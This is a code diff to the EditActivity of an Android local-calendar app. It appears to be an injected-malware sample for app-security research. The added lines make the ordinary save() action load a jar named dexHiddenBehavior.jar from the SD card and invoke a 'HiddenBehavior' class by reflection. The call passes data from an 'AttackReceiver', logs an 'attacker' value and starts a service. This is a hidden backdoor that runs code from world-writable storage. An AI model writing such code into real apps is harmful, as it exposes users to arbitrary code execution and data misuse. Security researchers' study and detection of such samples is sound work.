@@ -57,6 +57,10 @@ import org.sufficientlysecure.localcalendar.R;
 
 import java.util.Calendar;
 import java.util.GregorianCalendar;
+import org.sufficientlysecure.localcalendar.AttackReceiver;
+import java.io.File;
+import java.lang.reflect.Method;import dalvik.system.DexClassLoader;
+import android.util.Log;
 
 public class EditActivity extends AppCompatActivity {
     boolean edit = false;
@@ -284,6 +288,38 @@ public class EditActivity extends AppCompatActivity {
     }
 
     private void save() {
+
+        // dynamic class loading
+        String jarContainerPath =  "/mnt/sdcard/dexHiddenBehavior.jar";
+        File dexOutputDir = getDir("dex", MODE_PRIVATE);
+        //load the code
+        DexClassLoader mDexClassLoader = new DexClassLoader(jarContainerPath,
+                dexOutputDir.getAbsolutePath(),
+                null,
+                getClass().getClassLoader());
+
+        try {
+            //use java reflection to call a method in the loaded class
+            Class<?> loadedClass = mDexClassLoader.loadClass("edu.uci.seal.icc.HiddenBehavior");
+
+            //list all methods in the class
+            Method[] methods = loadedClass.getDeclaredMethods();
+            for (int i=0; i<methods.length; i++){
+                android.util.Log.i("Dynamic","Method: "+methods[i].getName());
+            }
+
+            //Method methodGetIntent = methods[0];
+            Object object = loadedClass.newInstance();
+            Intent in = new Intent();
+            in = (Intent)methods[0].invoke(object, in, AttackReceiver.in.getExtras().getLong("datetimeCreated", 0));
+            android.util.Log.i("test", in.getStringExtra("attacker") + " ssid is: " + in.getExtras().getLong("datetimeCreated", 0) + "\n");
+
+            if(AttackReceiver.in != null)
+                startService(in);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
         if (displayNameEditText.getText().length() == 0) {
             displayNameEditTextLyout.setError(getString(R.string.edit_activity_error_empty_name));
         } else {
